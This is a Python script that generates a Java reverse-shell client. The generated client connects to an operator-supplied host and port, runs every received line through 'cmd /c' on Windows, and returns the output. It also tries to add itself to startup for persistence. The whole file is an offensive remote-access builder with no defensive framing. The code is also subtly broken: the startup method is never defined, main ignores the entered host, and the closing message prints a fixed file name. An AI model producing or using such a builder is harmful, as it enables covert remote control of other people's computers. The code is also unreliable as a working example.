host = input("HOST: ")
port = input("PORT: ")
name = input("FILENAME: ")

file = open(f"{name}.java", 'w')
file.write('''
package remote;

import java.nio.file.*;
import java.net.*;
import java.io.*;
import static javax.swing.JOptionPane.*;


class remote{
    static public void main(String[] args){
        Connect conn = new Connect();
        conn.addToStartup(true);
        conn.start("localhost", 8080);

    }
}

class Connect{
    private static Socket clientSocket;
    private static BufferedReader reader;
    private static BufferedReader in;
    private static BufferedReader input;
    private static PrintWriter out;
    private static PrintWriter fileWriter;
    private static Process runtime;
    private static String data;
    private static String output;


    public void start(String host, int port){
        try{
                clientSocket = new Socket("''' + host + '", ' + port + ''');

                in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
                System.out.println("working");
                out = new PrintWriter(clientSocket.getOutputStream());

                while ((data = in.readLine()).equals("exit") != true){
                    System.out.println(data);
                    runtime = Runtime.getRuntime().exec("cmd /c " + data);
                    data = null;

                    String line;
                    input = new BufferedReader(new InputStreamReader(runtime.getInputStream()));
                    while ((line = input.readLine()) != null){
                        if (line.isEmpty()){
                            continue;
                        }
                        output += "\\n"+line;
                    }
                    System.out.println(output + "\\n%");
                    out.println(output + "\\n%");
                    out.flush();
                    output = "EMPTY";
            }

        } catch (IOException e){
            System.out.println(e.getMessage());
        }
    }
}
    ''')
print('file was builded, filename is Jelly')